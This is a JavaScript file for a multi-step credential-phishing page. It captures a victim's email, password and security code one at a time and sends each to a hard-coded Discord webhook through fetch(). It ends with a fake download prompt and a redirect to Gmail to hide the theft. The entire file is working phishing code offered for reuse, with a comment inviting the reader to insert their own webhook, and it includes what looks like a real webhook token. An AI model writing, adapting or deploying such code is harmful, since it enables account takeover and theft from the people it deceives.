// Discord webhook URL - Replace with your own
const webhookURL = "https://discord.com/api/webhooks/1408714249747959938/ZwbmMpuIfQecRugxW5F6Nny0SwBawMZi4uMQipZzuJh7Z0po6ViuI_39oLr2AGOw164R";

// Elements
const step1 = document.getElementById("step1");
const step2 = document.getElementById("step2");
const step3 = document.getElementById("step3");
const step4 = document.getElementById("step4"); // New step 4 div

const emailInput = document.getElementById("email");
const passwordInput = document.getElementById("password");
const securityCodeInput = document.getElementById("securityCode");

const toStep2Btn = document.getElementById("toStep2");
const toStep3Btn = document.getElementById("toStep3");
const toStep4Btn = document.getElementById("toStep4"); // New button for step 4
const finishBtn = document.getElementById("finishBtn"); // Finish button on step 4

const emailDisplay = document.getElementById("emailDisplay");
const verifyEmail = document.getElementById("verifyEmail");

// Enable/disable Next buttons depending on input
emailInput.addEventListener("input", () => {
  toStep2Btn.disabled = emailInput.value.trim() === "";
});

passwordInput.addEventListener("input", () => {
  toStep3Btn.disabled = passwordInput.value.trim() === "";
});

securityCodeInput.addEventListener("input", () => {
  toStep4Btn.disabled = securityCodeInput.value.trim() === "";
});

// Helper: Send data to webhook
function sendToWebhook(content) {
  fetch(webhookURL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content }),
  }).catch(console.error);
}

// Step 1 -> Step 2
toStep2Btn.addEventListener("click", () => {
  const email = emailInput.value.trim();
  if (!email) return;

  emailDisplay.textContent = email;
  verifyEmail.textContent = email;

  sendToWebhook(`**Email:** ${email}`);

  step1.style.display = "none";
  step2.style.display = "block";
});

// Step 2 -> Step 3
toStep3Btn.addEventListener("click", () => {
  const password = passwordInput.value.trim();
  if (!password) return;

  sendToWebhook(`**Password:** ${password}`);

  step2.style.display = "none";
  step3.style.display = "block";
});

// Step 3 -> Step 4
toStep4Btn.addEventListener("click", () => {
  const code = securityCodeInput.value.trim();
  if (!code) return;

  sendToWebhook(`**Security Code:** ${code}`);

  step3.style.display = "none";
  step4.style.display = "block";
});

// Finish button on Step 4
finishBtn.addEventListener("click", () => {
  alert("Thank you! Your file is Downloading, Open the file to continue.");
  window.location.href = "https://gmail.com"; // Change to your final page
});
